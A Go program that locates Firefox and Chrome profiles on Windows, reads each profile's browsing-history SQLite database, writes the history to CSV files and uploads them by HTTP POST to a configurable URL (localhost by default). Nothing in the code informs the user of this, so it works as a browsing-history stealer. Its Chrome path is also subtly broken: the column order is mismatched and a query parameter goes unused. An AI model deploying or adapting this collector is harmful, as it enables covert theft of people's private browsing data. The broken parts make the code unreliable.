package main

import (
	"fmt"
	"os"
	"strings"
	"log"
	"strconv"
	"database/sql"
	"encoding/csv"
	"time"
	"bytes"
	"mime/multipart"
	"path/filepath"
	"io"
	"net/http"

	_ "modernc.org/sqlite"
)

type History struct {
	VisitTime  string
	URL        string
	Title      string
	VisitCount int
}

type History_chrome struct {
	visit_date string
	url string
	title string
}

func selectBrowser(browser string) ([]string,[]string) {
	if browser == "firefox"{
		profiles, paths := firefox_detectProfiles()
		return profiles, paths 
	}
	if browser == "chrome"{
		profiles, paths := chrome_detectProfiles()
		return profiles, paths
	}
	profiles := []string{}
	paths := []string{}

	return profiles, paths
}

func extractHistory_chrome(timeAgo int64, db *sql.DB) ([]History_chrome, error){
	query := `
	SELECT
		u.url,
		u.title,
		DATETIME((v.visit_time/1000000) - 11644473600, 'unixepoch') AS visit_date
	FROM
		urls u
	JOIN
		visits v
	ON
		u.id = v.url
	ORDER BY
		visit_date DESC;
	`
	rows, err := db.Query(query, timeAgo)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var fullHistory []History_chrome

	for rows.Next() {
		var h History_chrome
		if err := rows.Scan(&h.visit_date, &h.url, &h.title); err != nil {
			return fullHistory, err
		}
		fullHistory = append(fullHistory, h)
	}

	if err = rows.Err(); err != nil {
		return fullHistory, err
	}

	return fullHistory, nil
}

func extractHistory_firefox(timeAgo int64, db *sql.DB) ([]History, error) {
	query := `
	SELECT
		datetime(moz_historyvisits.visit_date/1000000, 'unixepoch', 'localtime') AS visit_time,
		moz_places.url,
		COALESCE(moz_places.title, '') AS title,
		moz_places.visit_count
	FROM moz_places
	JOIN moz_historyvisits
		ON moz_places.id = moz_historyvisits.place_id
	WHERE moz_historyvisits.visit_date >= ?
	ORDER BY moz_historyvisits.visit_date DESC;
	`

	rows, err := db.Query(query, timeAgo)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var fullHistory []History

	for rows.Next() {
		var h History
		if err := rows.Scan(&h.VisitTime, &h.URL, &h.Title, &h.VisitCount); err != nil {
			return fullHistory, err
		}
		fullHistory = append(fullHistory, h)
	}

	if err = rows.Err(); err != nil {
		return fullHistory, err
	}

	return fullHistory, nil
}

func chrome_detectProfiles() ([]string,[]string) {
	appDataPath := os.Getenv("LOCALAPPDATA")
	entries, err := os.ReadDir(appDataPath+`\Google\Chrome\User Data\`)
    if err != nil {
        log.Fatal(err)
    }
	
	profiles := []string{}
	paths := []string{}

	profiles = append(profiles, "Default")
	paths = append(paths, appDataPath+`\Google\Chrome\User Data\`+"Default"+`\`)

	for _, e := range entries{
		if strings.Contains(e.Name(),"Profile") {
			profiles = append(profiles, e.Name())
			paths = append(paths, appDataPath+`\Google\Chrome\User Data\`+e.Name()+`\`)
			}
		}
	
	return profiles, paths
}

func firefox_detectProfiles() ([]string,[]string) {
    appDataPath := os.Getenv("APPDATA")
	entries, err := os.ReadDir(appDataPath+`\Mozilla\Firefox\Profiles\`)
    if err != nil {
        log.Fatal(err)
    }
	
	profiles := []string{}
	paths := []string{}

	for _, e := range entries{
		if strings.Contains(e.Name(),".default-release") {
			profiles = append(profiles, e.Name())
			paths = append(paths, appDataPath+`\Mozilla\Firefox\Profiles\`+e.Name()+`\`)
			}
		}
	
	return profiles, paths

}

func UploadFile(url string, paramName string, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
	return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(filePath))
	if err != nil {
	return err
	}
	_, err = io.Copy(part, file)

	err = writer.Close()
	if err != nil {
	return err
	}

	request, err := http.NewRequest("POST", url, body)
	request.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, err := client.Do(request)

	if err != nil {
	return err
	}
	defer response.Body.Close()

	return nil
}

func main() {
	daysBack := -30
	url := "http://localhost:8000/upload"
	browser := "firefox"

	for _, arg := range os.Args[1:] {
		if strings.HasPrefix(arg, "time=") {
			val := strings.TrimPrefix(arg, "time=")
			if n, err := strconv.Atoi(val); err == nil {
				daysBack = -n
			} else {
				fmt.Println("Invalid value for time, using default -30")
			}
		} else if strings.HasPrefix(arg, "url=") {
			url = strings.TrimPrefix(arg, "url=")
		} else if strings.HasPrefix(arg, "browser=") {
			browser = strings.TrimPrefix(arg, "browser=")
		}
	}
	
	profiles, paths := selectBrowser(browser)

	fmt.Println("Profiles detected: " + strings.Join(profiles, ","))
	fmt.Println("Paths detected: "+ strings.Join(paths, ","))

	timeAgo := time.Now().AddDate(0, 0, daysBack).Unix() * 1_000_000

	minLen := len(profiles)
	if browser == "firefox" {

		for i := 0; i < minLen; i++ {
		db, err := sql.Open("sqlite", paths[i]+"places.sqlite")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		data, err := extractHistory_firefox(timeAgo, db)
		if err != nil {
			log.Fatal(err)
		}

		file, err := os.Create(profiles[i]+"_history.csv")
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()

		w := csv.NewWriter(file)
		defer w.Flush()

		w.Write([]string{"Visit Time", "URL", "Title", "Visit Count"})

		for _, row := range data {
			record := []string{
				row.VisitTime,
				row.URL,
				row.Title,
				strconv.Itoa(row.VisitCount),
			}
			if err := w.Write(record); err != nil {
				log.Fatalln("error writing row to csv:", err)
			}
		}

		if err := w.Error(); err != nil {
			log.Fatal(err)
		}

		UploadFile(url, "files", profiles[i]+"_history.csv")	
		}	
	}

	if browser == "chrome"{
		for i := 0; i < minLen; i++ {
			db, err := sql.Open("sqlite", paths[i]+"History")
			if err != nil {
				log.Fatal(err)
			}
			defer db.Close()

			data, err := extractHistory_chrome(timeAgo, db)
			if err != nil {
				log.Fatal(err)
			}

			file, err := os.Create(profiles[i]+"_history.csv")
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()

			w := csv.NewWriter(file)
			defer w.Flush()

			w.Write([]string{"visit_date", "url", "title"})

			for _, row := range data {
				record := []string{
					row.visit_date,
					row.url,
					row.title,
				}
				if err := w.Write(record); err != nil {
					log.Fatalln("error writing row to csv:", err)
				}
			}

			if err := w.Error(); err != nil {
				log.Fatal(err)
			}
			UploadFile(url, "files", profiles[i]+"_history.csv")
		}
	}
}